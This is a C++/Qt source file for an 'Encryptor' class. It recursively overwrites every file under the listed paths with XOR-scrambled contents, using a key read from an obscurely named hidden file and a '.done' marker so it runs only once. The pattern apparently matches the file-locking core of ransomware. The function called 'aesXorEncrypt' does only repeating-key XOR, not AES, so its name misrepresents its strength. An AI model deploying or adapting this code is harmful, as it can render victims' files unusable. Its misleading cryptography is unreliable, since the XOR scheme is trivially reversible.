#include "Encrypt.h"
#include <QFile>
#include <QDir>
#include <QDebug>
#include <QCoreApplication>
#include <QStandardPaths>

Encryptor::Encryptor(QObject *parent)
    : QObject(parent)
{
}

QByteArray Encryptor::generateKey(const QString &keyString)
{
    return QCryptographicHash::hash(keyString.toUtf8(), QCryptographicHash::Sha256);
}

QByteArray Encryptor::aesXorEncrypt(const QByteArray &data, const QByteArray &key)
{
    QByteArray result = data;
    for (int i = 0; i < data.size(); ++i)
        result[i] = data[i] ^ key[i % key.size()];
    return result;
}

bool Encryptor::encryptFile(const QString &filePath, const QByteArray &key)
{
    QFile file(filePath);
    if (!file.open(QIODevice::ReadOnly))
    {
        qWarning() << "Failed to open file for reading:" << filePath;
        return false;
    }

    QByteArray fileData = file.readAll();
    file.close();

    QByteArray encryptedData = aesXorEncrypt(fileData, key);

    if (!file.open(QIODevice::WriteOnly | QIODevice::Truncate))
    {
        qWarning() << "Failed to open file for writing:" << filePath;
        return false;
    }

    file.write(encryptedData);
    file.close();

    qDebug() << "Encrypted:" << filePath;
    return true;
}

void Encryptor::encryptDirectory(const QString &dirPath, const QByteArray &key)
{
    QDir dir(dirPath);
    QFileInfoList files = dir.entryInfoList(QDir::Files | QDir::NoDotAndDotDot);
    QFileInfoList dirs = dir.entryInfoList(QDir::Dirs | QDir::NoDotAndDotDot);

    for (const QFileInfo &fileInfo : files)
        encryptFile(fileInfo.absoluteFilePath(), key);

    for (const QFileInfo &subDir : dirs)
        encryptDirectory(subDir.absoluteFilePath(), key);
}

void Encryptor::encryptFromFile(const QString &pathsFile, const QString &keyString)
{
    QString doneFilePath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/.done";
    QDir dir;
    dir.mkpath(QFileInfo(doneFilePath).absolutePath());

    if (QFile::exists(doneFilePath)) {
        qDebug() << "Encryption skipped: .done file found.";
        emit encryptionFinished(false);
        return;
    }
    QFile file(pathsFile);
    if (!file.open(QIODevice::ReadOnly))
    {
        qWarning() << "Failed to open paths file:" << pathsFile;
        emit encryptionFinished(false);
        return;
    }
    QString keyFilePath = QDir(QCoreApplication::applicationDirPath()).filePath(".AhgsUcklasnd");

    QString storedKey;
    QFile keyFile(keyFilePath);
    if (keyFile.open(QIODevice::ReadOnly)) {
        storedKey = QString::fromUtf8(keyFile.readAll()).trimmed();
        keyFile.close();
    }
    QByteArray key = generateKey(storedKey);

    while (!file.atEnd())
    {
        QString path = QString::fromUtf8(file.readLine()).trimmed();
        if (path.isEmpty())
            continue;

        QFileInfo info(path);
        if (info.isFile())
        {
            if (!encryptFile(path, key))
                qWarning() << "Failed to encrypt file:" << path;
        }
        else if (info.isDir())
        {
            encryptDirectory(path, key);
        }
        else
        {
            qWarning() << "Invalid path:" << path;
        }
    }

    QFile doneFile(doneFilePath);
    if (doneFile.open(QIODevice::WriteOnly | QIODevice::Truncate)) {
        doneFile.write("done");
        doneFile.close();
        qDebug() << ".done file created at:" << doneFilePath;
    } else {
        qWarning() << "Failed to create .done file at:" << doneFilePath;
    }
    file.close();
    emit encryptionFinished(true);
}
